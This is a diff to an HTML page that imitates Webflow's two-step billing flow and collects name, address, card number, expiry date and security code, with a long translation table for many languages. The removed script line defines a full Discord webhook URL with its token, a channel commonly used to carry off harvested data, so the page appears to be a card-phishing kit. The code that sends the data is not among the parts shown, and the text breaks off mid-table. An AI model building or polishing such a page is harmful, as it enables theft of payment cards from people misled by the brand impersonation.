@@ -1,4 +1,6 @@
-<html lang="en"><head>
+<!doctype html>
+<html lang="en">
+<head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Webflow — Billing</title>
@@ -1316,6 +1318,235 @@
       padding:11px 12px;
     }
   }
+
+  .payment-input-wrap{
+    position:relative;
+    width:100%;
+  }
+
+  .payment-input-wrap input{
+    padding-right:48px;
+  }
+
+  .payment-field-icon{
+    position:absolute;
+    right:10px;
+    top:50%;
+    width:30px;
+    height:20px;
+    transform:translateY(-50%);
+    display:flex;
+    align-items:center;
+    justify-content:flex-end;
+    pointer-events:none;
+    color:#6D6D6D;
+    z-index:2;
+  }
+
+  .payment-field-icon svg{
+    display:block;
+    width:30px;
+    height:20px;
+  }
+
+  .card-brand-svg{
+    display:block;
+    width:30px;
+    height:20px;
+    object-fit:contain;
+  }
+
+  .card-brand-icon-stack{
+    display:flex;
+    align-items:center;
+    justify-content:flex-end;
+  }
+
+  .field.error .payment-input-wrap input{
+    border-color:#CF313B;
+    color:#CF313B;
+  }
+
+  .payment-field-icon.error{
+    color:#CF313B;
+  }
+
+  .payment-field-icon.cvc-default,
+  .payment-field-icon.cvc-default svg{
+    color:rgba(0,0,0,.60);
+  }
+
+  .payment-field-icon.error svg{
+    color:#CF313B;
+  }
+
+  .card-icons.default-group{
+    width:80px;
+    gap:4px;
+  }
+
+  .card-icons.default-group .card-brand-svg{
+    width:24px;
+    height:16px;
+    flex:0 0 24px;
+  }
+
+  .card-icons:not(.default-group) .card-brand-svg{
+    width:30px;
+    height:20px;
+  }
+
+  @media(max-width:600px){
+    .card-icons.default-group{
+      width:80px;
+    }
+  }
+
+  @keyframes native-autofill-out{
+    0%{opacity:1}
+    to{opacity:1}
+  }
+
+  input,
+  select{
+    appearance:none;
+    -webkit-appearance:none;
+    width:100%;
+    height:33px;
+    min-height:33px;
+    box-sizing:border-box;
+    display:block;
+    padding:8px;
+    margin:0;
+    background-color:#fff;
+    color:#000;
+    border:1px solid #E0E0E0;
+    border-radius:4px;
+    box-shadow:
+      inset 0 16px 16px -16px rgba(0,0,0,.01),
+      inset 0 12px 12px -12px rgba(0,0,0,.01),
+      inset 0 8px 8px -8px rgba(0,0,0,.02),
+      inset 0 4px 4px -4px rgba(0,0,0,.02),
+      inset 0 3px 3px -3px rgba(0,0,0,.02),
+      inset 0 1px 1px -1px rgba(0,0,0,.04);
+    font-family:Inter,-apple-system,"system-ui","Segoe UI",Roboto,Oxygen-Sans,
+      Ubuntu,Cantarell,"Helvetica Neue",Helvetica,Arial,
+      "Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol",sans-serif;
+    font-size:13px;
+    font-weight:400;
+    font-style:normal;
+    line-height:14.95px;
+    letter-spacing:normal;
+    font-variation-settings:normal;
+    font-feature-settings:normal;
+    color-scheme:light;
+    cursor:text;
+    outline-offset:0;
+    outline-width:2px;
+    overflow:clip;
+    touch-action:manipulation;
+    -webkit-font-smoothing:antialiased;
+    transition:
+      background .15s ease,
+      border .15s ease,
+      box-shadow .15s ease,
+      color .15s ease;
+    animation:native-autofill-out 0.001s ease 0s 1 normal none running;
+  }
+
+  input::placeholder,
+  select::placeholder{
+    color:#757575;
+    opacity:1;
+  }
+
+  input:hover,
+  select:hover{
+    border-color:#C4C4C4;
+  }
+
+  input:focus,
+  select:focus{
+    outline:none;
+    border-color:#146EF5;
+    box-shadow:
+      0 1px 1px rgba(0,0,0,.03),
+      0 3px 6px rgba(0,0,0,.02),
+      0 0 0 3px rgba(20,110,245,.20);
+  }
+
+  .field label{
+    display:block;
+    color:rgba(0,0,0,.60);
+    margin:0 0 4px;
+    font-size:12px;
+    line-height:16px;
+    font-weight:400;
+    letter-spacing:normal;
+  }
+
+  .field.error input{
+    color:#CF313B;
+    border-color:#CF313B;
+    background:#fff;
+    box-shadow:
+      inset 0 16px 16px -16px rgba(0,0,0,.01),
+      inset 0 12px 12px -12px rgba(0,0,0,.01),
+      inset 0 8px 8px -8px rgba(0,0,0,.02),
+      inset 0 4px 4px -4px rgba(0,0,0,.02),
+      inset 0 3px 3px -3px rgba(0,0,0,.02),
+      inset 0 1px 1px -1px rgba(0,0,0,.04);
+  }
+
+  .field.error input:focus{
+    border-color:#CF313B;
+    box-shadow:
+      0 1px 1px rgba(0,0,0,.03),
+      0 3px 6px rgba(0,0,0,.02),
+      0 0 0 3px rgba(207,49,59,.20);
+  }
+
+  .field.success input{
+    border-color:#146EF5;
+  }
+
+  .payment-input-wrap input{
+    padding-right:48px;
+  }
+
+  .payment-input-wrap{
+    position:relative;
+  }
+
+  .amex-card-svg{
+    width:24px;
+    height:16px;
+    display:block;
+    flex:0 0 24px;
+  }
+
+  /* Keep interactive UI free of browser link previews/underlines on hover. */
+  a,
+  a:hover,
+  a:focus,
+  a:active{
+    text-decoration:none;
+  }
+
+  .brand,
+  .brand:hover,
+  .brand:focus,
+  .brand:active,
+  .cancel-link,
+  .cancel-link:hover,
+  .cancel-link:focus,
+  .cancel-link:active{
+    text-decoration:none !important;
+  }
+
+  a{
+    color:inherit;
+  }
 </style>
 
 
@@ -1327,24 +1558,29 @@
 <header>
   <div class="header-row">
     <a class="brand" aria-label="Webflow" href="https://webflow.com/dashboard">
-      <svg data-wf-icon="WebflowIcon" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+      <svg data-wf-icon="WebflowIcon" width="16" height="16" viewBox="0 0 16 16"
+           fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
         <g>
-          <path fill-rule="evenodd" clip-rule="evenodd" d="M15.3334 4L11.2916 12H7.49528L9.18675 8.68446H9.11086C7.7154 10.5186 5.63335 11.726 2.66675 12V8.73034C2.66675 8.73034 4.56456 8.61685 5.68023 7.42922H2.66675V4.00006H6.05357V6.8205L6.12959 6.82018L7.51356 4.00006H10.0749V6.80261L10.151 6.80249L11.5869 4H15.3334Z" fill="currentColor"></path>
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M15.3334 4L11.2916 12H7.49528L9.18675 8.68446H9.11086C7.7154 10.5186 5.63335 11.726 2.66675 12V8.73034C2.66675 8.73034 4.56456 8.61685 5.68023 7.42922H2.66675V4.00006H6.05357V6.8205L6.12959 6.82018L7.51356 4.00006H10.0749V6.80261L10.151 6.80249L11.5869 4H15.3334Z"
+            fill="currentColor"></path>
         </g>
       </svg>
     </a>
-    <div class="step" id="stepIndicator" aria-label="Step 1 of 2"><span class="step-current">Step 1</span><span class="step-rest">of 2</span></div>
+    <div class="step" id="stepIndicator" aria-label="Step 1 of 2">
+      <span class="step-current">Step 1</span><span class="step-rest">of 2</span>
+    </div>
   </div>
-  <div class="progress"><div class="bar" id="progressBar" style="width: 50%;"></div></div>
+  <div class="progress"><div class="bar" id="progressBar"></div></div>
 </header>
 
 <main>
-  <section class="card checkout-loading hidden" id="loadingState" aria-live="polite" aria-busy="true">
-    <div class="loading-mark" id="loadingMark" aria-hidden="true" style="display: block;"></div>
-    <div class="success-mark" id="successMark" aria-hidden="true" style="display: none;">
+  <section class="card checkout-loading hidden" id="loadingState" aria-live="polite" aria-busy="false">
+    <div class="loading-mark" id="loadingMark" aria-hidden="true"></div>
+    <div class="success-mark" id="successMark" aria-hidden="true">
       <svg viewBox="0 0 16 16" width="16" height="16" fill="none" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="8" cy="8" r="7" stroke="#146ef5" stroke-width="2"></circle>
-        <path d="M4.5 8.1L6.9 10.4L11.5 5.8" stroke="#146ef5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path>
+        <circle cx="8" cy="8" r="7" stroke="#146ef5" stroke-width="2"/>
+        <path d="M4.5 8.1L6.9 10.4L11.5 5.8" stroke="#146ef5" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
       </svg>
     </div>
   </section>
@@ -1353,37 +1589,54 @@
   <section class="card" id="step1">
     <h1>Billing details</h1>
     <p class="sub">Enter your billing details to continue.</p>
-    <form id="billingForm" autocomplete="on" novalidate="">
+    <form id="billingForm" autocomplete="on" novalidate>
       <div class="grid">
         <div class="full field" id="nameField">
           <label for="name">Full name</label>
-          <input id="name" name="name" type="text" autocomplete="name" placeholder="Full name" required="" aria-describedby="nameError">
+          <input id="name" name="name" type="text" autocomplete="name"
+                 placeholder="Full name" required aria-describedby="nameError">
           <div class="error-text" id="nameError"></div>
         </div>
         <div class="full field" id="addressField">
-          <label for="address">Address</label>
-          <input id="address" name="address" type="text" autocomplete="street-address" placeholder="Street address" required="" aria-describedby="addressError">
+          <label for="address">Address line 1</label>
+          <input id="address" name="address" type="text"
+                 autocomplete="address-line1" placeholder="Address line 1"
+                 required aria-describedby="addressError">
           <div class="error-text" id="addressError"></div>
+        </div>
+        <div class="full field" id="address2Field">
+          <label for="address2">Address line 2</label>
+          <input id="address2" name="address2" type="text"
+                 autocomplete="address-line2"
+                 placeholder="Apt., suite, unit number, etc. (optional)"
+                 aria-describedby="address2Error">
+          <div class="error-text" id="address2Error"></div>
         </div>
         <div class="field" id="cityField">
           <label for="city">City</label>
-          <input id="city" name="city" type="text" autocomplete="address-level2" placeholder="City" required="" aria-describedby="cityError">
+          <input id="city" name="city" type="text"
+                 autocomplete="address-level2" placeholder="City"
+                 required aria-describedby="cityError">
           <div class="error-text" id="cityError"></div>
         </div>
         <div class="field" id="stateField">
-          <label for="state">State / Province</label>
-          <input id="state" name="state" type="text" autocomplete="address-level1" placeholder="State / province" required="" aria-describedby="stateError">
+          <label for="state">State</label>
+          <input id="state" name="state" type="text"
+                 autocomplete="address-level1" placeholder="State"
+                 required aria-describedby="stateError">
           <div class="error-text" id="stateError"></div>
         </div>
         <div class="field full" id="postalField">
           <label for="postal">Postal code</label>
-          <input id="postal" name="postal" type="text" inputmode="numeric" autocomplete="postal-code" placeholder="Postal code" pattern="[0-9A-Za-z][0-9A-Za-z -]{2,9}" required="" aria-describedby="postalError">
+          <input id="postal" name="postal" type="text" inputmode="numeric"
+                 autocomplete="postal-code" placeholder="Postal code"
+                 pattern="[0-9A-Za-z][0-9A-Za-z -]{2,9}" required aria-describedby="postalError">
           <div class="error-text" id="postalError"></div>
         </div>
       </div>
       <div class="actions actions-billing">
         <a class="cancel-link" href="https://webflow.com/dashboard">Cancel</a>
-        <button class="primary" id="continueButton" type="submit" disabled="">Continue</button>
+        <button class="primary" id="continueButton" type="submit" disabled>Continue</button>
       </div>
     </form>
   </section>
@@ -1391,21 +1644,33 @@
   <section class="card hidden" id="step2">
     <h1>Payment method</h1>
     <p class="sub">Enter your payment details to continue.</p>
-    <form id="paymentForm" autocomplete="on" novalidate="">
+    <form id="paymentForm" autocomplete="on" novalidate>
       <div class="grid">
         <div class="full field" id="cardField">
           <label for="card">Card number</label>
-          <input id="card" name="card" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="Card number" maxlength="23" minlength="19" required="" aria-describedby="cardError">
+          <div class="payment-input-wrap" id="cardInputWrap">
+            <input id="card" name="card" type="text" inputmode="numeric"
+                   autocomplete="cc-number" placeholder="Card number"
+                   maxlength="23" minlength="19" required aria-describedby="cardError">
+            <div class="payment-field-icon card-icons" id="cardIcon" aria-hidden="true"></div>
+          </div>
           <div class="error-text" id="cardError"></div>
         </div>
         <div class="field" id="expiryField">
           <label for="expiry">Expiration date</label>
-          <input id="expiry" name="expiry" type="text" inputmode="numeric" autocomplete="cc-exp" placeholder="MM / YY" maxlength="7" required="" aria-describedby="expiryError">
+          <input id="expiry" name="expiry" type="text" inputmode="numeric"
+                 autocomplete="cc-exp" placeholder="MM / YY" maxlength="7"
+                 required aria-describedby="expiryError">
           <div class="error-text" id="expiryError"></div>
         </div>
         <div class="field" id="cvcField">
           <label for="cvc">Security code</label>
-          <input id="cvc" name="cvc" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="CVC" maxlength="4" required="" aria-describedby="cvcError">
+          <div class="payment-input-wrap" id="cvcInputWrap">
+            <input id="cvc" name="cvc" type="text" inputmode="numeric"
+                   autocomplete="cc-csc" placeholder="CVC" maxlength="4"
+                   required aria-describedby="cvcError">
+            <div class="payment-field-icon cvc-icons" id="cvcIcon" aria-hidden="true"></div>
+          </div>
           <div class="error-text" id="cvcError"></div>
         </div>
       </div>
@@ -1414,7 +1679,7 @@
       </p>
       <div class="actions">
         <button class="secondary" type="button" id="back">Back</button>
-        <button class="primary" id="saveButton" type="submit" disabled="">Save</button>
+        <button class="primary" id="saveButton" type="submit" disabled>Save</button>
       </div>
     </form>
   </section>
@@ -1424,7 +1689,841 @@
 <script>
 document.addEventListener('DOMContentLoaded', () => {
 
-  const TEST_WEBHOOK_URL = "https://discord.com/api/webhooks/1534009201917956198/pElS1mrB5KnDYqLHoQMfhsNNi8dBfq8cg_bEvVmUtUUtUvRFWXa_4bKcjg6zCF4Ye8nj";
+  const TRANSLATIONS = {
+    en: {
+      title: "Webflow — Billing",
+      billingTitle: "Billing details",
+      billingSub: "Enter your billing details to continue.",
+      paymentTitle: "Payment method",
+      paymentSub: "Enter your payment details to continue.",
+      fullName: "Full name",
+      address1: "Address line 1",
+      address2: "Address line 2",
+      address2Placeholder: "Apt., suite, unit number, etc. (optional)",
+      city: "City",
+      state: "State",
+      postal: "Postal code",
+      card: "Card number",
+      expiry: "Expiration date",
+      cvc: "Security code",
+      fullNamePlaceholder: "Full name",
+      address1Placeholder: "Address line 1",
+      cityPlaceholder: "City",
+      statePlaceholder: "State",
+      postalPlaceholder: "Postal code",
+      cardPlaceholder: "Card number",
+      expiryPlaceholder: "MM / YY",
+      cvcPlaceholder: "CVC",
+      cancel: "Cancel",
+      continue: "Continue",
+      back: "Back",
+      save: "Save",
+      consent: "Your payment method will be saved to your account and used for future billing.",
+      errors: {
+        fullName: "Enter your full name.",
+        address: "Enter your billing address.",
+        city: "Enter your city.",
+        state: "Enter your state.",
+        postal: "Enter a valid postal code.",
+        cardEmpty: "Enter your card number.",
+        cardIncomplete: "Enter the complete card number.",
+        cardInvalid: "Check your card number.",
+        expiryInvalid: "Enter a valid expiration date.",
+        expiryMonth: "Enter a valid expiration month.",
+        cvc: "Enter a valid security code."
+      }
+    },
+    fr: {
+      title: "Webflow — Facturation",
+      billingTitle: "Coordonnées de facturation",
+      billingSub: "Saisissez vos coordonnées de facturation pour continuer.",
+      paymentTitle: "Mode de paiement",
+      paymentSub: "Saisissez vos informations de paiement pour continuer.",
+      fullName: "Nom complet",
+      address1: "Adresse ligne 1",
+      address2: "Adresse ligne 2",
+      address2Placeholder: "Appartement, suite, unité, etc. (facultatif)",
+      city: "Ville",
+      state: "État",
+      postal: "Code postal",
+      card: "Numéro de carte",
+      expiry: "Date d’expiration",
+      cvc: "Cryptogramme",
+      fullNamePlaceholder: "Nom complet",
+      address1Placeholder: "Adresse ligne 1",
+      cityPlaceholder: "Ville",
+      statePlaceholder: "État",
+      postalPlaceholder: "Code postal",
+      cardPlaceholder: "Numéro de carte",
+      expiryPlaceholder: "MM / AA",
+      cvcPlaceholder: "CVC",
+      cancel: "Annuler",
+      continue: "Continuer",
+      back: "Retour",
+      save: "Enregistrer",
+      consent: "Votre mode de paiement sera enregistré sur votre compte et utilisé pour les futures facturations.",
+      errors: {
+        fullName: "Saisissez votre nom complet.",
+        address: "Saisissez votre adresse de facturation.",
+        city: "Saisissez votre ville.",
+        state: "Saisissez votre état.",
+        postal: "Saisissez un code postal valide.",
+        cardEmpty: "Saisissez votre numéro de carte.",
+        cardIncomplete: "Saisissez le numéro de carte complet.",
+        cardInvalid: "Vérifiez votre numéro de carte.",
+        expiryInvalid: "Saisissez une date d’expiration valide.",
+        expiryMonth: "Saisissez un mois d’expiration valide.",
+        cvc: "Saisissez un code de sécurité valide."
+      }
+    },
+    es: {
+      title: "Webflow — Facturación",
+      billingTitle: "Datos de facturación",
+      billingSub: "Introduce tus datos de facturación para continuar.",
+      paymentTitle: "Método de pago",
+      paymentSub: "Introduce tus datos de pago para continuar.",
+      fullName: "Nombre completo",
+      address1: "Dirección, línea 1",
+      address2: "Dirección, línea 2",
+      address2Placeholder: "Apartamento, suite, unidad, etc. (opcional)",
+      city: "Ciudad",
+      state: "Estado",
+      postal: "Código postal",
+      card: "Número de tarjeta",
+      expiry: "Fecha de caducidad",
+      cvc: "Código de seguridad",
+      fullNamePlaceholder: "Nombre completo",
+      address1Placeholder: "Dirección, línea 1",
+      cityPlaceholder: "Ciudad",
+      statePlaceholder: "Estado",
+      postalPlaceholder: "Código postal",
+      cardPlaceholder: "Número de tarjeta",
+      expiryPlaceholder: "MM / AA",
+      cvcPlaceholder: "CVC",
+      cancel: "Cancelar",
+      continue: "Continuar",
+      back: "Atrás",
+      save: "Guardar",
+      consent: "Tu método de pago se guardará en tu cuenta y podrá utilizarse para futuras facturaciones.",
+      errors: {
+        fullName: "Introduce tu nombre completo.",
+        address: "Introduce tu dirección de facturación.",
+        city: "Introduce tu ciudad.",
+        state: "Introduce tu estado.",
+        postal: "Introduce un código postal válido.",
+        cardEmpty: "Introduce tu número de tarjeta.",
+        cardIncomplete: "Introduce el número de tarjeta completo.",
+        cardInvalid: "Comprueba tu número de tarjeta.",
+        expiryInvalid: "Introduce una fecha de caducidad válida.",
+        expiryMonth: "Introduce un mes de caducidad válido.",
+        cvc: "Introduce un código de seguridad válido."
+      }
+    },
+    de: {
+      title: "Webflow — Abrechnung",
+      billingTitle: "Rechnungsdaten",
+      billingSub: "Gib deine Rechnungsdaten ein, um fortzufahren.",
+      paymentTitle: "Zahlungsmethode",
+      paymentSub: "Gib deine Zahlungsdaten ein, um fortzufahren.",
+      fullName: "Vollständiger Name",
+      address1: "Adresszeile 1",
+      address2: "Adresszeile 2",
+      address2Placeholder: "Wohnung, Suite, Einheit usw. (optional)",
+      city: "Stadt",
+      state: "Bundesland",
+      postal: "Postleitzahl",
+      card: "Kartennummer",
+      expiry: "Ablaufdatum",
+      cvc: "Sicherheitscode",
+      fullNamePlaceholder: "Vollständiger Name",
+      address1Placeholder: "Adresszeile 1",
+      cityPlaceholder: "Stadt",
+      statePlaceholder: "Bundesland",
+      postalPlaceholder: "Postleitzahl",
+      cardPlaceholder: "Kartennummer",
+      expiryPlaceholder: "MM / JJ",
+      cvcPlaceholder: "CVC",
+      cancel: "Abbrechen",
+      continue: "Weiter",
+      back: "Zurück",
+      save: "Speichern",
+      consent: "Deine Zahlungsmethode wird in deinem Konto gespeichert und für zukünftige Abrechnungen verwendet.",
+      errors: {
+        fullName: "Gib deinen vollständigen Namen ein.",
+        address: "Gib deine Rechnungsadresse ein.",
+        city: "Gib deine Stadt ein.",
+        state: "Gib dein Bundesland ein.",
+        postal: "Gib eine gültige Postleitzahl ein.",
+        cardEmpty: "Gib deine Kartennummer ein.",
+        cardIncomplete: "Gib die vollständige Kartennummer ein.",
+        cardInvalid: "Überprüfe deine Kartennummer.",
+        expiryInvalid: "Gib ein gültiges Ablaufdatum ein.",
+        expiryMonth: "Gib einen gültigen Ablaufmonat ein.",
+        cvc: "Gib einen gültigen Sicherheitscode ein."
+      }
+    },
+    it: {
+      title: "Webflow — Fatturazione",
+      billingTitle: "Dati di fatturazione",
+      billingSub: "Inserisci i dati di fatturazione per continuare.",
+      paymentTitle: "Metodo di pagamento",
+      paymentSub: "Inserisci i dati di pagamento per continuare.",
+      fullName: "Nome e cognome",
+      address1: "Indirizzo, riga 1",
+      address2: "Indirizzo, riga 2",
+      address2Placeholder: "Appartamento, interno, unità, ecc. (facoltativo)",
+      city: "Città",
+      state: "Stato",
+      postal: "CAP",
+      card: "Numero carta",
+      expiry: "Data di scadenza",
+      cvc: "Codice di sicurezza",
+      fullNamePlaceholder: "Nome e cognome",
+      address1Placeholder: "Indirizzo, riga 1",
+      cityPlaceholder: "Città",
+      statePlaceholder: "Stato",
+      postalPlaceholder: "CAP",
+      cardPlaceholder: "Numero carta",
+      expiryPlaceholder: "MM / AA",
+      cvcPlaceholder: "CVC",
+      cancel: "Annulla",
+      continue: "Continua",
+      back: "Indietro",
+      save: "Salva",
+      consent: "Il tuo metodo di pagamento verrà salvato nel tuo account e utilizzato per le fatturazioni future.",
+      errors: {
+        fullName: "Inserisci il tuo nome completo.",
+        address: "Inserisci il tuo indirizzo di fatturazione.",
+        city: "Inserisci la tua città.",
+        state: "Inserisci il tuo stato.",
+        postal: "Inserisci un CAP valido.",
+        cardEmpty: "Inserisci il numero della carta.",
+        cardIncomplete: "Inserisci il numero completo della carta.",
+        cardInvalid: "Controlla il numero della carta.",
+        expiryInvalid: "Inserisci una data di scadenza valida.",
+        expiryMonth: "Inserisci un mese di scadenza valido.",
+        cvc: "Inserisci un codice di sicurezza valido."
+      }
+    },
+    pt: {
+      title: "Webflow — Faturamento",
+      billingTitle: "Dados de faturamento",
+      billingSub: "Insira seus dados de faturamento para continuar.",
+      paymentTitle: "Método de pagamento",
+      paymentSub: "Insira seus dados de pagamento para continuar.",
+      fullName: "Nome completo",
+      address1: "Endereço, linha 1",
+      address2: "Endereço, linha 2",
+      address2Placeholder: "Apartamento, suíte, unidade etc. (opcional)",
+      city: "Cidade",
+      state: "Estado",
+      postal: "Código postal",
+      card: "Número do cartão",
+      expiry: "Data de validade",
+      cvc: "Código de segurança",
+      fullNamePlaceholder: "Nome completo",
+      address1Placeholder: "Endereço, linha 1",
+      cityPlaceholder: "Cidade",
+      statePlaceholder: "Estado",
+      postalPlaceholder: "Código postal",
+      cardPlaceholder: "Número do cartão",
+      expiryPlaceholder: "MM / AA",
+      cvcPlaceholder: "CVC",
+      cancel: "Cancelar",
+      continue: "Continuar",
+      back: "Voltar",
+      save: "Salvar",
+      consent: "Seu método de pagamento será salvo na sua conta e poderá ser usado para futuras cobranças.",
+      errors: {
+        fullName: "Insira seu nome completo.",
+        address: "Insira seu endereço de faturamento.",
+        city: "Insira sua cidade.",
+        state: "Insira seu estado.",
+        postal: "Insira um código postal válido.",
+        cardEmpty: "Insira o número do cartão.",
+        cardIncomplete: "Insira o número completo do cartão.",
+        cardInvalid: "Verifique o número do cartão.",
+        expiryInvalid: "Insira uma data de validade válida.",
+        expiryMonth: "Insira um mês de validade válido.",
+        cvc: "Insira um código de segurança válido."
+      }
+    },
+    nl: {
+      title: "Webflow — Facturering",
+      billingTitle: "Factuurgegevens",
+      billingSub: "Vul je factuurgegevens in om door te gaan.",
+      paymentTitle: "Betaalmethode",
+      paymentSub: "Vul je betaalgegevens in om door te gaan.",
+      fullName: "Volledige naam",
+      address1: "Adresregel 1",
+      address2: "Adresregel 2",
+      address2Placeholder: "Appartement, suite, unit, enz. (optioneel)",
+      city: "Plaats",
+      state: "Provincie",
+      postal: "Postcode",
+      card: "Kaartnummer",
+      expiry: "Vervaldatum",
+      cvc: "Beveiligingscode",
+      fullNamePlaceholder: "Volledige naam",
+      address1Placeholder: "Adresregel 1",
+      cityPlaceholder: "Plaats",
+      statePlaceholder: "Provincie",
+      postalPlaceholder: "Postcode",
+      cardPlaceholder: "Kaartnummer",
+      expiryPlaceholder: "MM / JJ",
+      cvcPlaceholder: "CVC",
+      cancel: "Annuleren",
+      continue: "Doorgaan",
+      back: "Terug",
+      save: "Opslaan",
+      consent: "Je betaalmethode wordt opgeslagen in je account en kan voor toekomstige facturering worden gebruikt.",
+      errors: {
+        fullName: "Vul je volledige naam in.",
+        address: "Vul je factuuradres in.",
+        city: "Vul je plaats in.",
+        state: "Vul je provincie in.",
+        postal: "Vul een geldige postcode in.",
+        cardEmpty: "Vul je kaartnummer in.",
+        cardIncomplete: "Vul het volledige kaartnummer in.",
+        cardInvalid: "Controleer je kaartnummer.",
+        expiryInvalid: "Vul een geldige vervaldatum in.",
+        expiryMonth: "Vul een geldige vervalmaand in.",
+        cvc: "Vul een geldige beveiligingscode in."
+      }
+    },
+    tr: {
+      title: "Webflow — Faturalandırma",
+      billingTitle: "Fatura bilgileri",
+      billingSub: "Devam etmek için fatura bilgilerinizi girin.",
+      paymentTitle: "Ödeme yöntemi",
+      paymentSub: "Devam etmek için ödeme bilgilerinizi girin.",
+      fullName: "Ad soyad",
+      address1: "Adres satırı 1",
+      address2: "Adres satırı 2",
+      address2Placeholder: "Daire, ofis, birim vb. (isteğe bağlı)",
+      city: "Şehir",
+      state: "Eyalet",
+      postal: "Posta kodu",
+      card: "Kart numarası",
+      expiry: "Son kullanma tarihi",
+      cvc: "Güvenlik kodu",
+      fullNamePlaceholder: "Ad soyad",
+      address1Placeholder: "Adres satırı 1",
+      cityPlaceholder: "Şehir",
+      statePlaceholder: "Eyalet",
+      postalPlaceholder: "Posta kodu",
+      cardPlaceholder: "Kart numarası",
+      expiryPlaceholder: "AA / YY",
+      cvcPlaceholder: "CVC",
+      cancel: "İptal",
+      continue: "Devam et",
+      back: "Geri",
+      save: "Kaydet",
+      consent: "Ödeme yönteminiz hesabınıza kaydedilecek ve gelecekteki faturalandırmalarda kullanılabilecektir.",
+      errors: {
+        fullName: "Ad soyadınızı girin.",
+        address: "Fatura adresinizi girin.",
+        city: "Şehrinizi girin.",
+        state: "Eyaletinizi girin.",
+        postal: "Geçerli bir posta kodu girin.",
+        cardEmpty: "Kart numaranızı girin.",
+        cardIncomplete: "Kart numarasının tamamını girin.",
+        cardInvalid: "Kart numaranızı kontrol edin.",
+        expiryInvalid: "Geçerli bir son kullanma tarihi girin.",
+        expiryMonth: "Geçerli bir son kullanma ayı girin.",
+        cvc: "Geçerli bir güvenlik kodu girin."
+      }
+    },
+    pl: {
+      title: "Webflow — Rozliczenia",
+      billingTitle: "Dane rozliczeniowe",
+      billingSub: "Wprowadź dane rozliczeniowe, aby kontynuować.",
+      paymentTitle: "Metoda płatności",
+      paymentSub: "Wprowadź dane płatności, aby kontynuować.",
+      fullName: "Imię i nazwisko",
+      address1: "Adres, wiersz 1",
+      address2: "Adres, wiersz 2",
+      address2Placeholder: "Mieszkanie, lokal, jednostka itp. (opcjonalnie)",
+      city: "Miasto",
+      state: "Województwo",
+      postal: "Kod pocztowy",
+      card: "Numer karty",
+      expiry: "Data ważności",
+      cvc: "Kod zabezpieczający",
+      fullNamePlaceholder: "Imię i nazwisko",
+      address1Placeholder: "Adres, wiersz 1",
+      cityPlaceholder: "Miasto",
+      statePlaceholder: "Województwo",
+      postalPlaceholder: "Kod pocztowy",
+      cardPlaceholder: "Numer karty",
+      expiryPlaceholder: "MM / RR",
+      cvcPlaceholder: "CVC",
+      cancel: "Anuluj",
+      continue: "Kontynuuj",
+      back: "Wstecz",
+      save: "Zapisz",
+      consent: "Twoja metoda płatności zostanie zapisana na koncie i może być używana do przyszłych rozliczeń.",
+      errors: {
+        fullName: "Wpisz swoje imię i nazwisko.",
+        address: "Wpisz adres rozliczeniowy.",
+        city: "Wpisz swoje miasto.",
+        state: "Wpisz województwo.",
+        postal: "Wpisz prawidłowy kod pocztowy.",
+        cardEmpty: "Wpisz numer karty.",
+        cardIncomplete: "Wpisz pełny numer karty.",
+        cardInvalid: "Sprawdź numer karty.",
+        expiryInvalid: "Wpisz prawidłową datę ważności.",
+        expiryMonth: "Wpisz prawidłowy miesiąc ważności.",
+        cvc: "Wpisz prawidłowy kod zabezpieczający."
+      }
+    },
+    ru: {
+      title: "Webflow — Оплата",
+      billingTitle: "Платёжные данные",
+      billingSub: "Введите платёжные данные, чтобы продолжить.",
+      paymentTitle: "Способ оплаты",
+      paymentSub: "Введите платёжные данные, чтобы продолжить.",
+      fullName: "Полное имя",
+      address1: "Адрес, строка 1",
+      address2: "Адрес, строка 2",
+      address2Placeholder: "Квартира, офис, помещение и т. д. (необязательно)",
+      city: "Город",
+      state: "Область",
+      postal: "Почтовый индекс",
+      card: "Номер карты",
+      expiry: "Срок действия",
+      cvc: "Код безопасности",
+      fullNamePlaceholder: "Полное имя",
+      address1Placeholder: "Адрес, строка 1",
+      cityPlaceholder: "Город",
+      statePlaceholder: "Область",
+      postalPlaceholder: "Почтовый индекс",
+      cardPlaceholder: "Номер карты",
+      expiryPlaceholder: "ММ / ГГ",
+      cvcPlaceholder: "CVC",
+      cancel: "Отмена",
+      continue: "Продолжить",
+      back: "Назад",
+      save: "Сохранить",
+      consent: "Ваш способ оплаты будет сохранён в аккаунте и может использоваться для будущих платежей.",
+      errors: {
+        fullName: "Введите полное имя.",
+        address: "Введите платёжный адрес.",
+        city: "Введите город.",
+        state: "Введите область.",
+        postal: "Введите действительный почтовый индекс.",
+        cardEmpty: "Введите номер карты.",
+        cardIncomplete: "Введите полный номер карты.",
+        cardInvalid: "Проверьте номер карты.",
+        expiryInvalid: "Введите действительный срок действия.",
+        expiryMonth: "Введите действительный месяц.",
+        cvc: "Введите действительный код безопасности."
+      }
+    },
+    uk: {
+      title: "Webflow — Оплата",
+      billingTitle: "Платіжні дані",
+      billingSub: "Введіть платіжні дані, щоб продовжити.",
+      paymentTitle: "Спосіб оплати",
+      paymentSub: "Введіть платіжні дані, щоб продовжити.",
+      fullName: "Повне ім’я",
+      address1: "Адреса, рядок 1",
+      address2: "Адреса, рядок 2",
+      address2Placeholder: "Квартира, офіс, приміщення тощо (необов’язково)",
+      city: "Місто",
+      state: "Область",
+      postal: "Поштовий індекс",
+      card: "Номер картки",
+      expiry: "Термін дії",
+      cvc: "Код безпеки",
+      fullNamePlaceholder: "Повне ім’я",
+      address1Placeholder: "Адреса, рядок 1",
+      cityPlaceholder: "Місто",
+      statePlaceholder: "Область",
+      postalPlaceholder: "Поштовий індекс",
+      cardPlaceholder: "Номер картки",
+      expiryPlaceholder: "ММ / РР",
+      cvcPlaceholder: "CVC",
+      cancel: "Скасувати",
+      continue: "Продовжити",
+      back: "Назад",
+      save: "Зберегти",
+      consent: "Ваш спосіб оплати буде збережено в обліковому записі та може використовуватися для майбутніх платежів.",
+      errors: {
